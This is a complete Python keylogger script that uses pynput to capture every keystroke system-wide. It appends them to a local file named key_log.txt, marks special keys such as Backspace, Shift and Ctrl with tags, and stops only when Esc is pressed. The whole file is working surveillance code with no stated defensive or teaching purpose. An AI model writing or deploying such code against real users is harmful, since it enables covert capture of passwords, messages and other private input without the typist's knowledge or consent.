from pynput.keyboard import Key, Listener

# File where the keystrokes will be logged
log_file = "key_log.txt"

# Function to write the keystrokes to a file
def write_to_file(key):
    with open(log_file, "a") as f:
        # Convert the key to a readable string
        key = str(key).replace("'", "")
        
        # Handle special keys (like Enter, Space, etc.)
        if key == 'Key.space':
            f.write(" ")  # Record space as a space character
        elif key == 'Key.enter':
            f.write("\n")  # Record Enter as a new line
        elif key == 'Key.backspace':
            f.write("<BACKSPACE>")  # Indicate backspace
        elif key == 'Key.tab':
            f.write("<TAB>")
        elif key == 'Key.shift':
            f.write("<SHIFT>")
        elif key == 'Key.ctrl':
            f.write("<CTRL>")
        elif key == 'Key.alt':
            f.write("<ALT>")
        elif key == 'Key.esc':
            f.write("<ESC>")
        elif key == 'Key.caps_lock':
            f.write("<CAPS_LOCK>")
        else:
            f.write(key)  # Record normal character keys

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (can be extended if needed)
def on_release(key):
    if key == Key.esc:
        # Stop the listener if the escape key is pressed
        return False

# Setup the listener to detect key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
